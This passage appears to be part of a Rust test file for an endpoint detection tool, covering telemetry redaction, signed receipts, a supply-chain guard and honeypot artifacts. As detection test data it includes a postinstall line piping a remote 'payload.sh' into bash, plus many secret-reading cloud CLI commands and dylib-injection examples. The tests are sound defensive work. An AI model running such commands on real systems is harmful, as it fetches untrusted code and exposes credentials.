        });
        let err = serde_json::from_value::<EndpointReceiptEvidence>(unknown_evidence_field)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("rawSecret"),
            "expected unknown evidence field to be rejected, got {err}"
        );
    }

    #[test]
    fn telemetry_privacy_report_hashes_features_and_suppresses_raw_artifacts_by_default() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/Work/customer-secret.txt".to_string(),
            source_url: Some("https://intranet.example/download?token=secret".to_string()),
            content_preview: Some("raw customer token material".to_string()),
        });

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        assert_eq!(report.observation_count, 1);
        assert!(!report.raw_artifact_upload_permitted);
        assert!(report.hash_only_count > 0);
        assert!(report.raw_suppressed_count > 0);
        assert!(report.observations[0].projections.iter().any(|projection| {
            projection.field_path == "event.fileAccess.path"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
                && projection
                    .value_hash
                    .as_deref()
                    .is_some_and(|hash| hash.starts_with("0x"))
        }));
        assert!(report.observations[0].projections.iter().any(|projection| {
            projection.field_path == "event.fileAccess.contentPreview"
                && projection.redaction_class == EndpointEvidenceRedactionClass::LocalOnly
                && projection.raw_value.is_none()
        }));
    }

    #[test]
    fn telemetry_privacy_report_deserialization_rejects_unknown_fields() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/Work/customer-secret.txt".to_string(),
            source_url: Some("https://intranet.example/download?token=secret".to_string()),
            content_preview: Some("raw customer token material".to_string()),
        });
        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        assert_unknown_field_rejected::<EndpointTelemetryPrivacyReport>(
            serde_json::to_value(&report).unwrap(),
            "shadowRawArtifact",
        );
        assert_unknown_field_rejected::<EndpointTelemetryObservationProjection>(
            serde_json::to_value(&report.observations[0]).unwrap(),
            "shadowRawObservation",
        );
        assert_unknown_field_rejected::<EndpointTelemetryFieldProjection>(
            serde_json::to_value(&report.observations[0].projections[0]).unwrap(),
            "shadowRawValue",
        );
    }

    #[test]
    fn telemetry_privacy_report_hashes_dns_names_and_resolvers() {
        let event = observation(EndpointEvent::DnsLookup {
            query: "api.internal.example".to_string(),
            record_type: Some("A".to_string()),
            answers: vec!["10.1.2.3".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        let projections = &report.observations[0].projections;
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.query"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.recordType"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some("A")
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.resolver"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
        }));
    }

    #[test]
    fn telemetry_privacy_report_allows_raw_artifacts_only_in_explicit_mode() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });

        let default_report = EndpointTelemetryPrivacyReport::from_observations(
            std::slice::from_ref(&event),
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let raw_report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::RawArtifactPermitted,
        );

        assert!(!default_report.raw_artifact_upload_permitted);
        assert!(!default_report.observations[0]
            .projections
            .iter()
            .any(|projection| projection.raw_value.is_some()));
        assert!(raw_report.raw_artifact_upload_permitted);
        assert!(raw_report.observations[0]
            .projections
            .iter()
            .any(|projection| {
                projection.field_path == "event.toolCall.parameters"
                    && projection.redaction_class
                        == EndpointEvidenceRedactionClass::RawArtifactPermitted
                    && projection
                        .raw_value
                        .as_deref()
                        .is_some_and(|value| value.contains("customer secret"))
            }));
    }

    #[test]
    fn endpoint_telemetry_privacy_receipt_binds_mode_and_counts() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });
        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let keypair = hush_core::Keypair::from_seed(&[41u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_telemetry_privacy(EndpointTelemetryPrivacyReceiptInput {
                local_sequence: 41,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                report: &report,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::PrivacyReport
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(report.report_id.as_str())
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.telemetry_privacy")
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "privacyMode"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawSuppressedCount"));
        assert!(receipt.evidence.iter().all(|item| item.raw_value.is_none()));

        let mut leaked_hash_only_receipt = receipt.clone();
        leaked_hash_only_receipt.evidence[0].raw_value =
            Some("raw customer secret material".to_string());
        assert!(leaked_hash_only_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("raw evidence"));

        let mut mismatched_report_id = receipt.clone();
        if let Some(report_id_evidence) = mismatched_report_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "privacyReportId")
        {
            *report_id_evidence = EndpointReceiptEvidence::hashed(
                "privacyReportId",
                "telemetry_privacy_report:other",
            );
        }
        assert!(mismatched_report_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id evidence hash"));

        let mut relabeled_report_id = receipt.clone();
        relabeled_report_id.decision.finding_id =
            Some("telemetry_privacy_report:other".to_string());
        if let Some(report_id_evidence) = relabeled_report_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "privacyReportId")
        {
            *report_id_evidence = EndpointReceiptEvidence::hashed(
                "privacyReportId",
                "telemetry_privacy_report:other",
            );
        }
        assert!(relabeled_report_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id"));

        let mut missing_raw_suppressed_count = receipt.clone();
        missing_raw_suppressed_count
            .evidence
            .retain(|item| item.key != "rawSuppressedCount");
        assert!(missing_raw_suppressed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report raw suppressed count evidence"));

        let mut mismatched_raw_receipt = receipt;
        mismatched_raw_receipt.evidence[0].redaction_class =
            EndpointEvidenceRedactionClass::RawArtifactPermitted;
        mismatched_raw_receipt.evidence[0].raw_value =
            Some("different raw customer secret material".to_string());
        assert!(mismatched_raw_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("raw evidence hash"));
    }

    #[test]
    fn endpoint_telemetry_privacy_receipt_binds_raw_artifact_approval() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });
        let reason_hash = sha256(b"incident ir-41 live collection approved").to_hex_prefixed();
        let report = EndpointTelemetryPrivacyReport::from_observations_with_raw_artifact_approval(
            &[event],
            EndpointTelemetryPrivacyMode::RawArtifactPermitted,
            Some("approval-ir-41"),
            Some(reason_hash.as_str()),
        );
        let receipt =
            EndpointDecisionReceipt::for_telemetry_privacy(EndpointTelemetryPrivacyReceiptInput {
                local_sequence: 42,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                report: &report,
            });

        receipt
            .validate()
            .expect("raw privacy receipt should validate");
        assert_eq!(
            report.raw_artifact_approval_id.as_deref(),
            Some("approval-ir-41")
        );
        assert_eq!(
            report.raw_artifact_approval_reason_hash.as_deref(),
            Some(reason_hash.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawArtifactApprovalId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawArtifactApprovalReasonHash"));

        let mut missing_approval = receipt.clone();
        missing_approval
            .evidence
            .retain(|item| item.key != "rawArtifactApprovalId");
        assert!(missing_approval
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report raw artifact approval id evidence"));

        let mut mismatched_approval = receipt;
        if let Some(approval) = mismatched_approval
            .evidence
            .iter_mut()
            .find(|item| item.key == "rawArtifactApprovalId")
        {
            *approval = EndpointReceiptEvidence::hashed("rawArtifactApprovalId", "approval-other");
        }
        assert!(mismatched_approval
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id"));
    }

    #[test]
    fn supply_chain_guard_flags_risky_npm_postinstall_script() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.install_script.risky");
        assert_eq!(findings[0].severity, DetectionSeverity::High);
        assert!(findings[0].mitre_attack.contains(&"T1195.002".to_string()));
    }

    #[test]
    fn supply_chain_guard_flags_unsigned_downloaded_binary() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut event = observation(EndpointEvent::ProcessExec {
            image: "/Users/alice/Downloads/build-helper".to_string(),
            args: vec!["--postinstall".to_string()],
            env: BTreeMap::new(),
        });
        event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Unsigned,
            notarized: Some(false),
            ..CodeSignatureStatus::default()
        };

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.unsigned_binary.dev_path");
    }

    #[test]
    fn supply_chain_guard_flags_signature_drift_and_injection() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut drift_event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/developer-tool".to_string(),
            args: vec!["build".to_string()],
            env: BTreeMap::new(),
        });
        drift_event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Signed,
            cdhash: Some("actual-cdhash".to_string()),
            expected_cdhash: Some("expected-cdhash".to_string()),
            notarized: Some(true),
            ..CodeSignatureStatus::default()
        };
        let mut injection_env = BTreeMap::new();
        injection_env.insert(
            "DYLD_INSERT_LIBRARIES".to_string(),
            "/tmp/libshim.dylib".to_string(),
        );
        let package_manager_injection = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/npm".to_string(),
            args: vec!["install".to_string()],
            env: injection_env,
        });
        let dylib_event = observation(EndpointEvent::DylibLoad {
            path: "/Users/alice/Library/Caches/libspy.dylib".to_string(),
            target_image: Some("/usr/local/bin/node".to_string()),
            mechanism: Some("DYLD_INSERT_LIBRARIES".to_string()),
        });

        let drift_findings = guard.evaluate(&drift_event);
        let package_manager_findings = guard.evaluate(&package_manager_injection);
        let dylib_findings = guard.evaluate(&dylib_event);

        assert!(drift_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.signature_drift"));
        assert!(package_manager_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.package_manager_dylib_injection"));
        assert!(dylib_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.dylib_injection"));
    }

    #[test]
    fn supply_chain_guard_flags_persistence_and_unmanaged_browser_extensions() {
        let guard = SupplyChainRuntimeGuard::new();
        let launch_event = observation(EndpointEvent::LaunchPersistence {
            path: "/Users/alice/Library/LaunchAgents/com.example.updater.plist".to_string(),
            label: Some("com.example.updater".to_string()),
            operation: FileOperation::Create,
        });
        let extension_event = observation(EndpointEvent::BrowserExtensionInstall {
            browser: "chrome".to_string(),
            extension_id: Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()),
            path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
            source: Some("developer_mode".to_string()),
        });

        let launch_findings = guard.evaluate(&launch_event);
        let extension_findings = guard.evaluate(&extension_event);

        assert!(launch_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.launch_persistence"));
        assert!(extension_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.unmanaged_browser_extension"));
    }

    #[test]
    fn supply_chain_guard_flags_sensitive_cloud_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut aws_env = BTreeMap::new();
        aws_env.insert("AWS_ACCESS_KEY_ID".to_string(), "AKIAEXAMPLE".to_string());
        aws_env.insert("AWS_SECRET_ACCESS_KEY".to_string(), "secret".to_string());
        let aws_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/aws".to_string(),
            args: vec![
                "secretsmanager".to_string(),
                "get-secret-value".to_string(),
                "--secret-id".to_string(),
                "prod/db".to_string(),
            ],
            env: aws_env,
        });
        let gcloud_event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/gcloud".to_string(),
            args: vec![
                "auth".to_string(),
                "print-access-token".to_string(),
                "--impersonate-service-account".to_string(),
                "deploy@example.iam.gserviceaccount.com".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let github_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/gh".to_string(),
            args: vec![
                "secret".to_string(),
                "set".to_string(),
                "PROD_DB_URL".to_string(),
                "--body".to_string(),
                "redacted".to_string(),
                "--repo".to_string(),
                "acme/service".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let vercel_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/vercel".to_string(),
            args: vec![
                "env".to_string(),
                "pull".to_string(),
                ".env.local".to_string(),
                "--environment".to_string(),
                "production".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let netlify_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/netlify".to_string(),
            args: vec![
                "env:get".to_string(),
                "API_KEY".to_string(),
                "--context".to_string(),
                "production".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let mut wrangler_env = BTreeMap::new();
        wrangler_env.insert(
            "CLOUDFLARE_API_TOKEN".to_string(),
            "redacted-token".to_string(),
        );
        let wrangler_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/wrangler".to_string(),
            args: vec![
                "secret".to_string(),
                "put".to_string(),
                "API_TOKEN".to_string(),
                "--env".to_string(),
                "production".to_string(),
            ],
            env: wrangler_env,
        });
        let mut doctl_env = BTreeMap::new();
        doctl_env.insert(
            "DIGITALOCEAN_ACCESS_TOKEN".to_string(),
            "redacted-token".to_string(),
        );
        let doctl_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/doctl".to_string(),
            args: vec![
                "registry".to_string(),
                "docker-config".to_string(),
                "example-registry".to_string(),
                "--read-write".to_string(),
            ],
            env: doctl_env,
        });
        let mut fly_env = BTreeMap::new();
        fly_env.insert("FLY_API_TOKEN".to_string(), "redacted-token".to_string());
        let fly_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/fly".to_string(),
            args: vec![
                "secrets".to_string(),
                "set".to_string(),
                "DATABASE_URL=postgres://example".to_string(),
                "--app".to_string(),
                "api".to_string(),
            ],
            env: fly_env,
        });

        let aws_findings = guard.evaluate(&aws_event);
        let gcloud_findings = guard.evaluate(&gcloud_event);
        let github_findings = guard.evaluate(&github_event);
        let vercel_findings = guard.evaluate(&vercel_event);
        let netlify_findings = guard.evaluate(&netlify_event);
        let wrangler_findings = guard.evaluate(&wrangler_event);
        let doctl_findings = guard.evaluate(&doctl_event);
        let fly_findings = guard.evaluate(&fly_event);

        let aws_finding = aws_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing AWS cloud CLI sensitive operation finding"));
        assert!(aws_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "aws"));
        assert!(aws_finding.evidence.iter().any(
            |item| item.key == "credentialEnvKeys" && item.value.contains("AWS_ACCESS_KEY_ID")
        ));
        assert!(gcloud_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation"));
        let github_finding = github_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing GitHub CLI sensitive operation finding"));
        assert!(github_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "gh"));
        let vercel_finding = vercel_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Vercel CLI sensitive operation finding"));
        assert!(vercel_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "vercel"));
        let netlify_finding = netlify_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Netlify CLI sensitive operation finding"));
        assert!(netlify_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "netlify"));
        let wrangler_finding = wrangler_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Wrangler CLI sensitive operation finding"));
        assert!(wrangler_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "wrangler"));
        assert!(wrangler_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys"
                && item.value.contains("CLOUDFLARE_API_TOKEN")));
        let doctl_finding = doctl_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing doctl CLI sensitive operation finding"));
        assert!(doctl_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "doctl"));
        assert!(doctl_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys"
                && item.value.contains("DIGITALOCEAN_ACCESS_TOKEN")));
        let fly_finding = fly_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Fly CLI sensitive operation finding"));
        assert!(fly_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "fly"));
        assert!(fly_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys" && item.value.contains("FLY_API_TOKEN")));
    }

    #[test]
    fn supply_chain_guard_flags_secret_management_and_platform_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            (
                "/opt/homebrew/bin/op",
                vec!["item", "get", "prod/api-token"],
                "OP_SERVICE_ACCOUNT_TOKEN",
                "op",
            ),
            (
                "/usr/local/bin/vault",
                vec!["kv", "get", "secret/prod/api"],
                "VAULT_TOKEN",
                "vault",
            ),
            (
                "/opt/homebrew/bin/doppler",
                vec!["secrets", "download", "--no-file"],
                "DOPPLER_TOKEN",
                "doppler",
            ),
            (
                "/opt/homebrew/bin/heroku",
                vec!["config:get", "DATABASE_URL", "--app", "prod-api"],
                "HEROKU_API_KEY",
                "heroku",
            ),
            (
                "/opt/homebrew/bin/supabase",
                vec!["secrets", "list", "--project-ref", "prodref"],
                "SUPABASE_ACCESS_TOKEN",
                "supabase",
            ),
            (
                "/opt/homebrew/bin/firebase",
                vec![
                    "functions:secrets:access",
                    "STRIPE_WEBHOOK_SECRET",
                    "--project",
                    "prod-api",
                ],
                "FIREBASE_TOKEN",
                "firebase",
            ),
            (
                "/opt/homebrew/bin/railway",
                vec!["variables", "--service", "api"],
                "RAILWAY_TOKEN",
                "railway",
            ),
            (
                "/opt/homebrew/bin/stripe",
                vec!["login", "--api-key", "sk_test_redacted"],
                "STRIPE_API_KEY",
                "stripe",
            ),
            (
                "/opt/homebrew/bin/stripe",
                vec![
                    "listen",
                    "--print-secret",
                    "--forward-to",
                    "localhost:4242/webhook",
                ],
                "STRIPE_WEBHOOK_SECRET",
                "stripe",
            ),
            (
                "/opt/homebrew/bin/sentry-cli",
                vec!["login", "--auth-token=sk-SENTRYTOKEN_1234567890abcdef"],
                "SENTRY_AUTH_TOKEN",
                "sentry",
            ),
            (
                "/opt/homebrew/bin/snyk",
                vec!["auth", "--auth-token=sk-SNYKTOKEN_1234567890abcdef"],
                "SNYK_TOKEN",
                "snyk",
            ),
            (
                "/opt/homebrew/bin/bw",
                vec!["get", "item", "prod/api-token"],
                "BW_SESSION",
                "bitwarden",
            ),
            (
                "/opt/homebrew/bin/kubectl",
                vec!["get", "secret", "prod-token", "-o", "yaml"],
                "KUBECONFIG",
                "kubectl",
            ),
            (
                "/opt/homebrew/bin/pulumi",
                vec!["config", "get", "dbPassword", "--show-secrets"],
                "PULUMI_ACCESS_TOKEN",
                "pulumi",
            ),
            (
                "/opt/homebrew/bin/circleci",
                vec![
                    "context",
                    "store-secret",
                    "github",
                    "acme",
                    "production",
                    "DATABASE_URL",
                ],
                "CIRCLECI_CLI_TOKEN",
                "circleci",
            ),
            (
                "/opt/homebrew/bin/glab",
                vec![
                    "variable",
                    "set",
                    "DATABASE_URL",
                    "postgres://redacted",
                    "--masked",
                ],
                "GITLAB_TOKEN",
                "glab",
            ),
            (
                "/usr/local/bin/buildkite-agent",
                vec!["secret", "get", "deploy_key"],
                "BUILDKITE_AGENT_ACCESS_TOKEN",
                "buildkite",
            ),
            (
                "/usr/local/bin/drone",
                vec!["secret", "get", "acme/service", "deploy_key"],
                "DRONE_TOKEN",
                "drone",
            ),
            (
                "/opt/homebrew/bin/sem",
                vec!["secret", "create", "DATABASE_URL", "--value", "redacted"],
                "SEMAPHORE_API_TOKEN",
                "semaphore",
            ),
            (
                "/usr/local/bin/appveyor",
                vec!["encrypt", "--secret", "deploy-key"],
                "APPVEYOR_API_TOKEN",
                "appveyor",
            ),
            (
                "/usr/local/bin/woodpecker",
                vec!["secret", "list", "--repository", "acme/service"],
                "WOODPECKER_TOKEN",
                "woodpecker",
            ),
            (
                "/usr/local/bin/codefresh",
                vec!["auth", "create-token", "--scope", "pipeline:run"],
                "CODEFRESH_API_KEY",
                "codefresh",
            ),
            (
                "/opt/homebrew/bin/terraform",
                vec!["output", "-json"],
                "TF_TOKEN_app_terraform_io",
                "terraform",
            ),
            (
                "/opt/homebrew/bin/terragrunt",
                vec!["state", "pull"],
                "TERRAFORM_TOKEN",
                "terragrunt",
            ),
            (
                "/opt/homebrew/bin/tofu",
                vec!["show", "-json"],
                "TFE_TOKEN",
                "opentofu",
            ),
        ];

        for (image, args, env_key, expected_cli) in cases {
            let mut env = BTreeMap::new();
            env.insert(env_key.to_string(), "redacted".to_string());
            let event = observation(EndpointEvent::ProcessExec {
                image: image.to_string(),
                args: args.into_iter().map(str::to_string).collect(),
                env,
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
                .unwrap_or_else(|| {
                    panic!("missing sensitive CLI operation finding for {expected_cli}")
                });
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "cloudCli" && item.value == expected_cli),
                "missing cloudCli evidence for {expected_cli}"
            );
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "credentialEnvKeys" && item.value.contains(env_key)),
                "missing credential environment evidence for {expected_cli}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_package_registry_token_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut env = BTreeMap::new();
        env.insert("NODE_AUTH_TOKEN".to_string(), "redacted".to_string());
        let event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/npm".to_string(),
            args: vec![
                "token".to_string(),
                "list".to_string(),
                "--json".to_string(),
            ],
            env,
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.package_registry_token_operation")
            .unwrap_or_else(|| panic!("missing package registry token operation finding"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "packageManager" && item.value == "npm"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "packageRegistryRisk"
                && item.value.contains("npm authentication tokens")));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys" && item.value.contains("NODE_AUTH_TOKEN")));
    }

    #[test]
    fn deception_plan_materializes_without_overwriting_and_detects_access() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");

        let first = plan.materialize().unwrap();
        let second = plan.materialize().unwrap();

        assert_eq!(first.created.len(), plan.artifacts.len());
        assert_eq!(second.skipped.len(), plan.artifacts.len());

        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::SshPrivateKey)
            .unwrap();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: artifact.absolute_path(&root).display().to_string(),
            source_url: None,
            content_preview: None,
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_and_detection_metadata_deserialization_rejects_unknown_fields() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan.artifacts[0].clone();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let materialization_report = DeceptionMaterializationReport {
            created: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            skipped: Vec::new(),
        };
        let cleanup_report = DeceptionCleanupReport {
            dry_run: false,
            removed: materialization_report.created.clone(),
            would_remove: Vec::new(),
            missing: Vec::new(),
            refused: Vec::new(),
        };
        let rotation_report = DeceptionRotationReport {
            dry_run: false,
            cleanup: cleanup_report.clone(),
            materialization: Some(materialization_report.clone()),
            deregistered_artifact_count: plan.artifacts.len(),
            registered_artifact_count: plan.artifacts.len(),
            remaining_registered_artifact_count: plan.artifacts.len(),
        };
        let detection = DetectionFinding {
            finding_id: "finding:test".to_string(),
            rule_id: "deception.honey_artifact_touched".to_string(),
            title: "Honey artifact touched".to_string(),
            severity: DetectionSeverity::High,
            confidence: 0.99,
            description: "A honey artifact was accessed".to_string(),
            observation_id: "obs:test".to_string(),
            timestamp: Utc::now(),
            evidence: vec![DetectionEvidence {
                key: "artifactId".to_string(),
                value: artifact.artifact_id.clone(),
            }],
            mitre_attack: vec!["T1552".to_string()],
            tags: vec!["deception".to_string()],
            remediation: "Review causal graph".to_string(),
        };

        assert_unknown_field_rejected::<SupplyChainRuntimeGuard>(
            serde_json::to_value(&guard).unwrap(),
            "shadowHoneyArtifacts",
        );
        assert_unknown_field_rejected::<HoneyArtifact>(
            serde_json::to_value(&artifact).unwrap(),
            "shadowMarker",
        );
        assert_unknown_field_rejected::<DeceptionPlan>(
            serde_json::to_value(&plan).unwrap(),
            "shadowRoot",
        );
        assert_unknown_field_rejected::<DeceptionMaterializationReport>(
            serde_json::to_value(&materialization_report).unwrap(),
            "shadowCreated",
        );
        assert_unknown_field_rejected::<DeceptionCleanupReport>(
            serde_json::to_value(&cleanup_report).unwrap(),
            "shadowRemoved",
        );
        assert_unknown_field_rejected::<DeceptionRotationReport>(
            serde_json::to_value(&rotation_report).unwrap(),
            "shadowRotation",
        );
        assert_unknown_field_rejected::<DetectionEvidence>(
            serde_json::to_value(&detection.evidence[0]).unwrap(),
            "shadowEvidenceValue",
        );
        assert_unknown_field_rejected::<DetectionFinding>(
            serde_json::to_value(&detection).unwrap(),
            "shadowFinding",
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_honey_hostname_network_flow() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::InternalHostname)
            .unwrap();
        let honey_host = artifact.internal_hostname().unwrap().to_string();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::NetworkFlow {
            host: honey_host.clone(),
            port: 443,
            protocol: Some("https".to_string()),
            url: Some(format!("https://{honey_host}/admin")),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
